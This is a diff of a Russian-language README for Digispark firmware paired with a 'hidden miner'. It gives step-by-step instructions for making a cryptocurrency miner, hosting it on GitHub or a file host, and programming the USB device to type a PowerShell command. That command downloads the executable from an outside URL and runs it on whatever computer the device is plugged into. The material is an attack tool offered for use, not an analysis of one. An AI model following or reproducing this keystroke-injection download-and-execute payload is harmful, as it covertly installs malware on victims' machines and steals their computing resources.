@@ -10,7 +10,7 @@ _Прошивка для digispark + скрытый майнер_
 - Устанавливаем [прошивку](firmware.ino) и открываем в [Arduino IDE](https://www.arduino.cc/en/software)
 - Создаем майнер (Советую на виртуалке) 
 > Видео-инструкция -- https://youtu.be/V3U5QreydyM?si=CV2yRZ7MG-l6zGF8
-- Загружаем на github/обменник/сервер майнер (инструкция)
+- Загружаем майнер на github/обменник/сервер (нужен полный путь до файла https://... exe)
 - Редактируем прошивку в Arduino IDE под себя
 > TrinketKeyboard.print("powershell -c \"Invoke-WebRequest -Uri 'ПРЯМАЯ ССЫЛКА НА ФАЙЛ https://...exe' -OutFile 'ПУТЬ КУДА БУДЕТ ЗАГРУЖАТЬСЯ ФАЙЛ/НАЗВАНИЕ ФАЙЛА.exe'; Start-Process 'ПУТЬ КУДА БУДЕТ ЗАГРУЖАТЬСЯ ФАЙЛ/НАЗВАНИЕ ФАЙЛА.exe'\"");
 
